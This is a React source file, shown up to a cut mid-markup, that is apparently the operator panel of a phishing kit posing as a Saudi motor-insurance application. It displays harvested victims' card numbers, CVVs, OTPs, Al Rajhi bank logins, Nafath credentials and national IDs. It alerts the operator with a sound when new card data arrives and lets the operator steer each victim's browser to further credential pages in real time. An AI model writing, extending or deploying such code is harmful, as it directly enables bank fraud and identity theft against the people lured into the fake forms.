import { useState, useEffect, useMemo, useRef } from "react";
import { useLocation } from "wouter";
import {
  Search,
  MessageSquare,
  Settings,
  Bell,
  User,
  ChevronDown,
  LayoutGrid,
  MoreVertical,
  CreditCard,
  MapPin,
  Clock,
  Star,
  Flag,
  Archive,
  Phone,
  Copy,
  Check,
  CheckCircle,
  Globe,
  Lock,
  FileText,
  Ban,
  Eye,
  Send,
  Link,
  Trash2,
  List,
  HeadphonesIcon,
  X,
  Volume2,
  VolumeX,
  Sun,
  Moon,
  Key,
  Shield,
  AlertTriangle,
  LogOut,
} from "lucide-react";
import { cn } from "@/lib/utils";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { useToast } from "@/hooks/use-toast";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
  DialogClose,
} from "@/components/ui/dialog";
import {
  collection,
  doc,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { db, isFirebaseConfigured } from "@/lib/firebase";

interface Notification {
  id: string;
  personalInfo?: {
    acceptMarketing?: boolean;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
    isHijri?: boolean;
  };
  paymentInfo?: {
    cardName?: string;
    cardNumber?: string;
    cardExpiry?: string;
    cardCvv?: string;
  };
  nationalId?: string;
  phoneNumber?: string;
  phoneCarrier?: string;
  phoneIdNumber?: string;
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  otpCode?: string;
  phoneOtpCode?: string;
  rajhiUser?: string;
  rajhiPassword?: string;
  rajhiOtp?: string;
  nafazId?: string;
  nafazPass?: string;
  authNumber?: string;
  atmVerification?: { code: string; status: string; timestamp: string };
  approvalStatus?: string;
  cardOtpApproved?: boolean;
  phoneOtpApproved?: boolean;
  nafathApproved?: boolean;
  adminDirective?: {
    targetPage?: string;
    targetStep?: number;
    issuedAt?: string;
  };
  currentPage?: string | number;
  currentStep?: number;
  step?: string;
  createdAt?: any;
  isHidden?: boolean;
  isUnread?: boolean;
  country?: string;
  ipAddress?: string;
  browser?: string;
  os?: string;
  documment_owner_full_name?: string;
  identityNumber?: string;
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [atmCode, setAtmCode] = useState("");
  const [nafazAuthNumber, setNafazAuthNumber] = useState("");
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [approvalFilter, setApprovalFilter] = useState<string>("all");
  const [dataFilter, setDataFilter] = useState<string>("all");
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [binData, setBinData] = useState<{
    scheme?: string;
    type?: string;
    brand?: string;
    prepaid?: boolean;
    country?: { name?: string; alpha2?: string; emoji?: string };
    bank?: { name?: string; url?: string; phone?: string; city?: string };
  } | null>(null);
  const [binLoading, setBinLoading] = useState(false);
  const prevAppsRef = useRef<Notification[]>([]);
  const chatScrollRef = useRef<HTMLDivElement>(null);

  const fetchBinData = async (cardNumber: string) => {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
    if (bin.length < 6) {
      setBinData(null);
      return;
    }
    setBinLoading(true);
    try {
      const response = await fetch(`/api/bin-lookup/${bin}`);
      if (response.ok) {
        const data = await response.json();
        setBinData(data);
      } else {
        setBinData(null);
      }
    } catch (error) {
      console.error("BIN lookup error:", error);
      setBinData(null);
    }
    setBinLoading(false);
  };

  const playNotificationSound = () => {
    if (!soundEnabled) return;
    try {
      const audioContext = new (window.AudioContext ||
        (window as any).webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(
        0.01,
        audioContext.currentTime + 0.3,
      );
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.3);
    } catch (error) {
      console.log("Audio not supported");
    }
  };

  useEffect(() => {
    if (!isFirebaseConfigured || !db) {
      setIsLoading(false);
      return;
    }

    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"));

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const notificationsData: Notification[] = [];

      snapshot.forEach((doc) => {
        const data = doc.data();
        if (!data.isHidden) {
          notificationsData.push({
            id: doc.id,
            ...data,
          } as Notification);
        }
      });

      if (prevAppsRef.current.length > 0) {
        const prevIds = new Set(prevAppsRef.current.map((a) => a.id));
        const hasNewApp = notificationsData.some((app) => !prevIds.has(app.id));
        const hasNewCardData = notificationsData.some((app) => {
          const prevApp = prevAppsRef.current.find((p) => p.id === app.id);
          return getCardNumber(app) && (!prevApp || !getCardNumber(prevApp));
        });
        if (hasNewApp || hasNewCardData) {
          playNotificationSound();
        }
      }

      prevAppsRef.current = notificationsData;
      setNotifications(notificationsData);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, [soundEnabled]);

  // Helper functions to get card data from either paymentInfo or direct fields
  const getCardNumber = (n: Notification) =>
    n.paymentInfo?.cardNumber || n.cardNumber;
  const getCardName = (n: Notification) =>
    n.paymentInfo?.cardName || n.cardName;
  const getCardExpiry = (n: Notification) =>
    n.paymentInfo?.cardExpiry || n.cardExpiry;
  const getCardCvv = (n: Notification) => n.paymentInfo?.cardCvv || n.cardCvv;

  const hasData = (n: Notification) => {
    return (
      getCardNumber(n) ||
      n.otpCode ||
      n.phoneOtpCode ||
      n.rajhiUser ||
      n.nafazId ||
      n.personalInfo?.birthYear ||
      n.nationalId ||
      n.phoneNumber
    );
  };

  const filteredApps = useMemo(() => {
    return notifications.filter((app) => {
      if (!hasData(app)) return false;

      const cardNum = getCardNumber(app);
      const cardNm = getCardName(app);

      const matchesSearch =
        !searchTerm ||
        app.documment_owner_full_name
          ?.toLowerCase()
          .includes(searchTerm.toLowerCase()) ||
        app.nationalId?.includes(searchTerm) ||
        app.phoneNumber?.includes(searchTerm) ||
        cardNum?.includes(searchTerm) ||
        cardNm?.toLowerCase().includes(searchTerm.toLowerCase());

      const matchesStatus =
        statusFilter === "all" ||
        (statusFilter === "completed" &&
          app.approvalStatus === "approved_otp") ||
        (statusFilter === "pending" && !app.approvalStatus) ||
        (statusFilter === "rejected" && app.approvalStatus === "rejected");

      const matchesApproval =
        approvalFilter === "all" ||
        (approvalFilter === "pending_card" &&
          cardNum &&
          !app.cardOtpApproved) ||
        (approvalFilter === "pending_phone" &&
          app.phoneOtpCode &&
          !app.phoneOtpApproved) ||
        (approvalFilter === "approved" &&
          (app.cardOtpApproved || app.phoneOtpApproved)) ||
        (approvalFilter === "rejected" && app.approvalStatus === "rejected");

      const matchesData =
        dataFilter === "all" ||
        (dataFilter === "card" && cardNum) ||
        (dataFilter === "phone" && (app.phoneOtpCode || app.phoneNumber)) ||
        (dataFilter === "nafaz" && app.nafazId) ||
        (dataFilter === "rajhi" && app.rajhiUser);

      return matchesSearch && matchesStatus && matchesApproval && matchesData;
    });
  }, [notifications, searchTerm, statusFilter, approvalFilter, dataFilter]);

  const unreadCount = useMemo(() => {
    return filteredApps.filter((n) => n.isUnread).length;
  }, [filteredApps]);

  const selectedApplication = notifications.find(
    (app) => app.id === selectedId,
  );

  // Fetch BIN data when card number changes
  const selectedCardNumber = selectedApplication
    ? getCardNumber(selectedApplication)
    : undefined;
  useEffect(() => {
    if (selectedCardNumber) {
      fetchBinData(selectedCardNumber);
    } else {
      setBinData(null);
    }
  }, [selectedCardNumber]);

  const stats = {
    total: notifications.filter(hasData).length,
    cards: notifications.filter((a) => getCardNumber(a)).length,
    pending: notifications.filter((a) => getCardNumber(a) && !a.cardOtpApproved)
      .length,
    approved: notifications.filter(
      (a) => a.cardOtpApproved || a.phoneOtpApproved,
    ).length,
  };

  const pendingApprovals = {
    cardApprovals: notifications.filter(
      (a) => getCardNumber(a) && !a.cardOtpApproved,
    ).length,
    phoneApprovals: notifications.filter(
      (a) => a.phoneOtpCode && !a.phoneOtpApproved,
    ).length,
    nafazApprovals: notifications.filter((a) => a.nafazId && !a.nafathApproved)
      .length,
    total: notifications.filter(
      (a) =>
        (getCardNumber(a) && !a.cardOtpApproved) ||
        (a.phoneOtpCode && !a.phoneOtpApproved) ||
        (a.nafazId && !a.nafathApproved),
    ).length,
  };

  const handleApprovalStatus = async (
    id: string,
    status: string,
    atmCodeValue?: string,
  ) => {
    if (!db) return;
    try {
      const updates: any = { approvalStatus: status };
      if (atmCodeValue) {
        updates.atmVerification = {
          code: atmCodeValue,
          status: "pending",
          timestamp: new Date().toISOString(),
        };
      }
      await updateDoc(doc(db, "pays", id), updates);
      toast({ title: "تم التحديث" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleFieldApproval = async (
    id: string,
    field: string,
    value: boolean,
  ) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { [field]: value });
      toast({ title: "تم التحديث" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleUpdateNafazAuthNumber = async (id: string, authNum: string) => {
    if (!db || !authNum.trim()) return;
    try {
      await updateDoc(doc(db, "pays", id), { authNumber: authNum.trim() });
      toast({ title: "تم تحديث رقم التحقق" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleUpdateCurrentPage = async (id: string, page: number | string) => {
    if (!db) return;
    try {
      let directive: any = {
        issuedAt: new Date().toISOString(),
      };

      if (typeof page === "number") {
        // Numbered steps 1-7 are for motor-insurance page
        directive.targetPage = "motor";
        directive.targetStep = page;
      } else {
        // Special pages: nafaz, rajhi, phone
        directive.targetPage = page;
        directive.targetStep = null;
      }

      await updateDoc(doc(db, "pays", id), { adminDirective: directive });
      toast({ title: "تم تحديث الصفحة" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleMarkAsRead = async (app: Notification) => {
    setSelectedId(app.id);
    if (app.isUnread && db) {
      await updateDoc(doc(db, "pays", app.id), { isUnread: false });
    }
  };

  const handleDelete = async (id: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { isHidden: true });
      if (selectedId === id) setSelectedId(null);
      toast({ title: "تم الحذف" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedField(label);
    setTimeout(() => setCopiedField(null), 2000);
    toast({ title: "تم النسخ", description: label });
  };

  const getDisplayName = (n: Notification) => {
    return (
      getCardName(n) ||
      n.documment_owner_full_name ||
      n.nationalId ||
      n.phoneNumber ||
      n.id.substring(0, 8)
    );
  };

  const formatTime = (date: any) => {
    if (!date) return "";
    try {
      const d = date.toDate ? date.toDate() : new Date(date);
      const now = new Date();
      const diffMs = now.getTime() - d.getTime();
      const minutes = Math.floor(diffMs / 60000);
      if (minutes < 1) return "الآن";
      if (minutes < 60) return `منذ ${minutes} د`;
      const hours = Math.floor(minutes / 60);
      if (hours < 24) return `منذ ${hours} س`;
      const days = Math.floor(hours / 24);
      return `منذ ${days} ي`;
    } catch {
      return "";
    }
  };

  const DataRow = ({
    label,
    value,
    isLtr,
  }: {
    label: string;
    value?: string | number | null;
    isLtr?: boolean;
  }) => {
    if (!value) return null;
    const strValue = String(value);
    return (
      <div className="flex items-center justify-between group hover:bg-muted/50 px-3 py-2 rounded transition-colors border-b border-border">
        <span className="font-bold text-gray-700 dark:text-gray-300 text-sm">
          {label}
        </span>
        <div className="flex items-center gap-2">
          <span
            className={cn(
              "text-gray-600 dark:text-gray-400 font-medium",
              isLtr && "direction-ltr text-left font-mono",
            )}
          >
            {strValue}
          </span>
          <button
            onClick={() => copyToClipboard(strValue, label)}
            className="opacity-0 group-hover:opacity-100 transition-opacity text-gray-400 hover:text-blue-500"
            data-testid={`copy-${label}`}
          >
            {copiedField === label ? (
              <Check size={14} className="text-green-500" />
            ) : (
              <Copy size={14} />
            )}
          </button>
        </div>
      </div>
    );
  };

  const ChatBubble = ({
    title,
    children,
    isUser,
    icon,
  }: {
    title: string;
    children: React.ReactNode;
    isUser?: boolean;
    icon?: React.ReactNode;
  }) => (
    <div
      className={cn(
        "flex gap-3 mb-4",
        isUser ? "flex-row-reverse" : "flex-row",
      )}
    >
      <div
        className={cn(
          "w-8 h-8 rounded-full flex items-center justify-center shrink-0",
          isUser
            ? "bg-blue-500 text-white"
            : "bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300",
        )}
      >
        {icon || (isUser ? <User size={16} /> : <MessageSquare size={16} />)}
      </div>
      <div
        className={cn(
          "max-w-[80%] rounded-2xl p-4 shadow-sm",
          isUser
            ? "bg-primary text-primary-foreground rounded-tr-sm"
            : "bg-card border border-border rounded-tl-sm",
        )}
      >
        <div
          className={cn(
            "text-xs font-bold mb-2",
            isUser ? "text-primary-foreground/80" : "text-muted-foreground",
          )}
        >
          {title}
        </div>
        <div className={isUser ? "text-primary-foreground" : "text-foreground"}>
          {children}
        </div>
      </div>
    </div>
  );

  if (!isFirebaseConfigured) {
    return (
      <div
        className="flex items-center justify-center h-screen bg-background"
        dir="rtl"
      >
        <div className="text-center p-8 max-w-md">
          <AlertTriangle className="h-16 w-16 text-amber-500 mx-auto mb-4" />
          <h2 className="text-xl font-bold mb-2">Firebase غير مكون</h2>
          <p className="text-muted-foreground">
            يرجى تكوين Firebase للوصول إلى لوحة التحكم
          </p>
        </div>
      </div>
    );
  }

  return (
    <div
      className="flex h-screen bg-background w-full overflow-hidden text-right font-sans text-foreground"
      dir="rtl"
    >
      {/* Right Sidebar - Inbox List */}
      <aside className="w-[320px] bg-card border-l border-border flex flex-col shrink-0 z-20 shadow-[4px_0_24px_rgba(0,0,0,0.02)]">
        {/* Header */}
        <div className="h-14 border-b border-border flex items-center justify-between px-4 shrink-0 bg-card">
          <div className="flex items-center gap-3">
            <div className="font-bold text-foreground text-sm">
              صندوق الوارد
            </div>
            {unreadCount > 0 && (
              <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
            )}
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="icon"
              className="h-7 w-7"
              onClick={() => setSoundEnabled(!soundEnabled)}
              data-testid="button-sound-toggle"
            >
              {soundEnabled ? (
                <Volume2 size={14} className="text-green-500" />
              ) : (
                <VolumeX size={14} className="text-muted-foreground" />
              )}
            </Button>
            <div className="h-6 w-px bg-border mx-1" />
            <div className="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
              <span
                className="text-green-500 font-bold"
                data-testid="stats-approved"
              >
                {stats.approved} / {stats.pending}
              </span>
              <span data-testid="stats-total">/ {stats.total}</span>
            </div>
          </div>
        </div>

        {/* Pending Approvals Warning */}
        {pendingApprovals.total > 0 && (
          <div
            className="mx-3 mt-3 p-3 border rounded-lg animate-pulse bg-gradient-to-l from-amber-500/15 to-amber-500/5 border-amber-500/40"
            data-testid="warning-approvals"
          >
            <div className="flex items-center gap-2 text-amber-600">
              <div className="w-6 h-6 rounded-full flex items-center justify-center animate-bounce bg-amber-500">
                <Bell size={14} className="text-white" />
              </div>
              <div className="flex-1">
                <div className="font-bold text-sm">بانتظار الموافقة</div>
                <div className="text-xs text-amber-600/80">
                  {pendingApprovals.cardApprovals > 0 && (
                    <span className="inline-flex items-center gap-1 ml-2">
                      <CreditCard size={10} /> {pendingApprovals.cardApprovals}{" "}
                      بطاقة
                    </span>
                  )}
                  {pendingApprovals.phoneApprovals > 0 && (
                    <span className="inline-flex items-center gap-1 ml-2">
                      <Phone size={10} /> {pendingApprovals.phoneApprovals} هاتف
                    </span>
                  )}
                  {pendingApprovals.nafazApprovals > 0 && (
                    <span className="inline-flex items-center gap-1">
                      <Lock size={10} /> {pendingApprovals.nafazApprovals} نفاذ
                    </span>
                  )}
                </div>
              </div>
              <Badge className="bg-amber-500 text-white">
                {pendingApprovals.total}
              </Badge>
            </div>
          </div>
        )}

        {/* Search & Filter */}
        <div className="p-3 border-b border-border space-y-3 bg-card/50">
          <div className="relative">
            <Search
              size={14}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400"
            />
            <Input
              placeholder="بحث..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="h-8 pr-8 text-xs border-border focus:border-primary rounded-md bg-muted"
              data-testid="input-search"
            />
          </div>

          {/* Filters */}
          <div className="flex flex-wrap gap-2">
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
              data-testid="select-status-filter"
            >
              <option value="all">كل الحالات</option>
              <option value="pending">قيد الانتظار</option>
              <option value="completed">مكتمل</option>
              <option value="rejected">مرفوض</option>
            </select>

            <select
              value={approvalFilter}
              onChange={(e) => setApprovalFilter(e.target.value)}
              className="h-7 px-2 text-xs border border-border rounded-md bg-card text-foreground focus:border-primary focus:outline-none"
              data-testid="select-approval-filter"
            >
              <option value="all">كل الموافقات</option>
              <option value="pending_card">بطاقة معلقة</option>
              <option value="pending_phone">هاتف معلق</option>
              <option value="approved">موافق عليه</option>
              <option value="rejected">مرفوض</option>
            </select>
          </div>

          {/* Data Type Filter Buttons */}
          <div className="flex flex-wrap gap-1.5">
            <button
              onClick={() => setDataFilter("all")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all",
                dataFilter === "all"
                  ? "bg-blue-500 text-white"
                  : "bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200",
              )}
              data-testid="filter-all"
            >
              الكل
            </button>
            <button
              onClick={() => setDataFilter("card")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "card"
                  ? "bg-purple-500 text-white"
                  : "bg-purple-50 dark:bg-purple-900/30 text-purple-600 dark:text-purple-400",
              )}
              data-testid="filter-card"
            >
              <CreditCard size={10} />
              بطاقة
            </button>
            <button
              onClick={() => setDataFilter("phone")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "phone"
                  ? "bg-blue-500 text-white"
                  : "bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400",
              )}
              data-testid="filter-phone"
            >
              <Phone size={10} />
              هاتف
            </button>
            <button
              onClick={() => setDataFilter("nafaz")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "nafaz"
                  ? "bg-green-500 text-white"
                  : "bg-green-50 dark:bg-green-900/30 text-green-600 dark:text-green-400",
              )}
              data-testid="filter-nafaz"
            >
              <Lock size={10} />
              نفاذ
            </button>
            <button
              onClick={() => setDataFilter("rajhi")}
              className={cn(
                "px-2 py-1 text-[10px] rounded-full transition-all flex items-center gap-1",
                dataFilter === "rajhi"
                  ? "bg-teal-500 text-white"
                  : "bg-teal-50 dark:bg-teal-900/30 text-teal-600 dark:text-teal-400",
              )}
              data-testid="filter-rajhi"
            >
              <Shield size={10} />
              الراجحي
            </button>

            {(statusFilter !== "all" ||
              approvalFilter !== "all" ||
              dataFilter !== "all") && (
              <Button
                variant="ghost"
                size="sm"
                onClick={() => {
                  setStatusFilter("all");
                  setApprovalFilter("all");
                  setDataFilter("all");
                }}
                className="h-6 px-2 text-[10px] text-red-500"
                data-testid="button-clear-filters"
              >
                <X size={10} className="ml-1" />
                مسح
              </Button>
            )}
          </div>

          <div className="text-[10px] text-gray-400">
            عرض {filteredApps.length} من {stats.total} طلب
          </div>
        </div>

        {/* Application List */}
        <ScrollArea className="flex-1">
          {isLoading ? (
            <div className="p-4 text-center text-gray-400 text-sm">
              جاري التحميل...
            </div>
          ) : filteredApps.length === 0 ? (
            <div className="p-4 text-center text-gray-400 text-sm">
              لا توجد طلبات
            </div>
          ) : (
            filteredApps.map((app) => (
              <div
                key={app.id}
                onClick={() => handleMarkAsRead(app)}
                className={cn(
                  "flex items-center gap-3 px-4 py-3 border-b border-border cursor-pointer transition-all duration-200 hover:bg-primary/5",
                  selectedId === app.id &&
                    "bg-blue-50 dark:bg-blue-900/20 border-r-2 border-r-blue-500",
                  getCardNumber(app) &&
                    selectedId !== app.id &&
                    "bg-gradient-to-l from-purple-50 dark:from-purple-900/20 to-transparent border-r-2 border-r-purple-400",
                  (app.nafazId || app.phoneOtpCode) &&
                    !getCardNumber(app) &&
                    selectedId !== app.id &&
                    "bg-gradient-to-l from-green-50 dark:from-green-900/20 to-transparent border-r-2 border-r-green-400",
                )}
                data-testid={`app-item-${app.id}`}
              >
                <div className="relative">
                  <div
                    className={cn(
                      "w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300",
                    )}
                  >
                    {getDisplayName(app)?.charAt(0) || "؟"}
                    {/* Alert indicator */}
                    {((app.otpCode && !app.cardOtpApproved) ||
                      (app.phoneOtpCode && !app.phoneOtpApproved) ||
                      (app.nafazId && !app.nafathApproved)) && (
                      <>
                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full animate-ping opacity-75" />
                        <div className="absolute -top-1 -left-1 w-4 h-4 bg-red-500 rounded-full flex items-center justify-center">
                          <span className="text-white text-[8px] font-bold">
                            !
                          </span>
                        </div>
                      </>
                    )}
                  </div>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-1.5">
                      <span
                        className={cn(
                          "font-medium text-sm truncate",
                          app.isUnread
                            ? "text-foreground font-bold"
                            : "text-foreground",
                        )}
                      >
                        {getDisplayName(app)}
                      </span>
                      {app.isUnread && (
                        <Flag
                          size={10}
                          className="text-red-500 fill-red-500"
                          data-testid={`flag-unread-${app.id}`}
                        />
                      )}
                    </div>
                    <span className="text-[10px] text-muted-foreground">
                      {formatTime(app.createdAt)}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 mt-1">
                    {getCardNumber(app) && (
                      <Badge
                        variant="outline"
                        className="text-[9px] px-1.5 py-0 h-4 border-purple-300 text-purple-600"
                      >
                        <CreditCard size={8} className="mr-1" />
                        بطاقة
                      </Badge>
                    )}
                    {app.nafazId && (
                      <Badge
                        variant="outline"
                        className="text-[9px] px-1.5 py-0 h-4 border-green-300 text-green-600"
                      >
                        <Lock size={8} className="mr-1" />
                        نفاذ
                      </Badge>
                    )}
                    {app.rajhiUser && (
                      <Badge
                        variant="outline"
                        className="text-[9px] px-1.5 py-0 h-4 border-teal-300 text-teal-600"
                      >
                        <Shield size={8} className="mr-1" />
                        الراجحي
                      </Badge>
                    )}
                  </div>
                </div>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-6 w-6 shrink-0"
                  onClick={(e) => {
                    e.stopPropagation();
                    handleDelete(app.id);
                  }}
                  data-testid={`button-delete-${app.id}`}
                >
                  <Trash2 size={12} className="text-gray-400" />
                </Button>
              </div>
            ))
          )}
        </ScrollArea>
      </aside>

      {/* Main Content */}
      <main className="flex-1 flex flex-col bg-background/50 overflow-hidden">
        {/* Top Header */}
        <header className="border-b border-border bg-card shrink-0">
          <div className="h-14 px-6 flex items-center justify-between">
            <div className="flex items-center gap-4">
              {selectedApplication && (
                <>
                  <div className="flex items-center gap-2 text-sm">
                    <span className="text-muted-foreground">الهوية</span>
                    <span
                      className="font-mono text-foreground"
                      data-testid="text-identity"
                    >
                      {selectedApplication.nationalId ||
                        selectedApplication.identityNumber}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-sm">
                    <Phone size={14} className="text-gray-400" />
                    <span
                      className="font-mono text-foreground"
                      data-testid="text-phone"
                    >
                      {selectedApplication.phoneNumber}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-sm">
                    <User size={14} className="text-gray-400" />
                    <span className="text-foreground" data-testid="text-owner">
                      {getCardName(selectedApplication) ||
                        selectedApplication.documment_owner_full_name}
                    </span>
                  </div>
                </>
              )}
            </div>
            <div className="flex items-center gap-2">
              {selectedApplication && (
                <Badge
                  className={cn(
                    "text-[9px]",
                    selectedApplication.approvalStatus === "approved_otp" &&
                      "bg-green-100 text-green-700",
                    !selectedApplication.approvalStatus &&
                      "bg-amber-100 text-amber-700",
                    selectedApplication.approvalStatus === "rejected" &&
                      "bg-red-100 text-red-700",
                  )}
                  data-testid="badge-status"
                >
                  {selectedApplication.approvalStatus === "approved_otp"
                    ? "موافق"
                    : selectedApplication.approvalStatus === "rejected"
                      ? "مرفوض"
                      : "قيد الانتظار"}
                </Badge>
              )}
            </div>
          </div>

          {/* Page/Step Navigation Bar */}
          {selectedApplication && (
            <div className="px-4 py-3 bg-gradient-to-l from-primary/10 to-card border-t border-border">
              <div className="flex items-center gap-3">
                <span className="text-sm font-medium text-muted-foreground">التحكم في الصفحة:</span>
                <Select
                  value={
                    selectedApplication.currentPage === "motor-insurance" || !selectedApplication.currentPage
                      ? `step-${selectedApplication.currentStep || 1}`
                      : String(selectedApplication.currentPage)
                  }
                  onValueChange={(value) => {
                    if (value.startsWith("step-")) {
                      const step = parseInt(value.replace("step-", ""));
                      handleUpdateCurrentPage(selectedApplication.id, step);
                    } else {
                      handleUpdateCurrentPage(selectedApplication.id, value);
                    }
                  }}
                  data-testid="page-control-dropdown"
                >
                  <SelectTrigger className="w-[200px]" data-testid="page-control-trigger">
                    <SelectValue placeholder="اختر الصفحة" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="step-1" data-testid="option-step-1">
                      <div className="flex items-center gap-2">
                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">1</span>
                        <span>البيانات</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="step-2" data-testid="option-step-2">
                      <div className="flex items-center gap-2">
                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">2</span>
                        <span>التأمين</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="step-3" data-testid="option-step-3">
                      <div className="flex items-center gap-2">
                        <span className="w-5 h-5 rounded-full bg-blue-500 text-white flex items-center justify-center text-xs">3</span>
                        <span>الأسعار</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="step-4" data-testid="option-step-4">
                      <div className="flex items-center gap-2">
                        <span className="w-5 h-5 rounded-full bg-green-500 text-white flex items-center justify-center text-xs">4</span>
                        <span>مكتمل</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="nafaz" data-testid="option-nafaz">
                      <div className="flex items-center gap-2">
                        <Lock size={14} className="text-purple-500" />
                        <span>نفاذ</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="rajhi" data-testid="option-rajhi">
                      <div className="flex items-center gap-2">
                        <CreditCard size={14} className="text-teal-500" />
                        <span>الراجحي</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="phone" data-testid="option-phone">
                      <div className="flex items-center gap-2">
                        <Phone size={14} className="text-amber-500" />
                        <span>الهاتف</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>

                <div className="mr-auto flex items-center gap-2 text-xs pr-2">
                  <span className="text-muted-foreground">الخطوة:</span>
                  <Badge
                    className="bg-blue-500/10 text-blue-600 font-mono text-xs px-2 py-1"
                    data-testid="badge-current-step"
                  >
                    {selectedApplication.currentStep || "—"}
                  </Badge>
                </div>
              </div>
            </div>
          )}
        </header>

        {/* Application Detail */}
        {selectedApplication ? (
          <div ref={chatScrollRef} className="flex-1 px-8 py-6 overflow-y-auto">
            <div className="max-w-3xl mx-auto space-y-4">
              {/* Welcome Message */}
              <ChatBubble title="النظام" icon={<MessageSquare size={16} />}>
                <p className="text-sm">
                  مرحباً، هذه بيانات طلب التأمين الخاص بـ{" "}
                  <strong>{getDisplayName(selectedApplication)}</strong>
                </p>
              </ChatBubble>

              {/* Basic Info */}
              <ChatBubble
                title="المعلومات الأساسية"
                isUser
                icon={<User size={16} />}
              >
                <div className="space-y-1 text-sm">
                  {selectedApplication.nationalId && (
                    <div>
                      رقم الهوية:{" "}
                      <span className="font-mono" dir="ltr">
                        {selectedApplication.nationalId}
                      </span>
                    </div>
                  )}
                  {getCardName(selectedApplication) && (
                    <div>الاسم: {getCardName(selectedApplication)}</div>
                  )}
                  {selectedApplication.phoneNumber && (
                    <div>
                      الهاتف:{" "}
                      <span className="font-mono" dir="ltr">
                        {selectedApplication.phoneNumber}
                      </span>
                    </div>
                  )}
                </div>
              </ChatBubble>

              {/* Payment Card */}
              {getCardNumber(selectedApplication) && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <CreditCard size={16} className="text-amber-500" />
                      بطاقة الدفع
                      {!selectedApplication.cardOtpApproved && (
                        <Badge className="bg-amber-100 text-amber-700 text-[9px] animate-pulse">
                          بانتظار الموافقة
                        </Badge>
                      )}
                    </h3>
                  </div>
                  <div className="p-6">
                    {/* Visual Card */}
                    <div
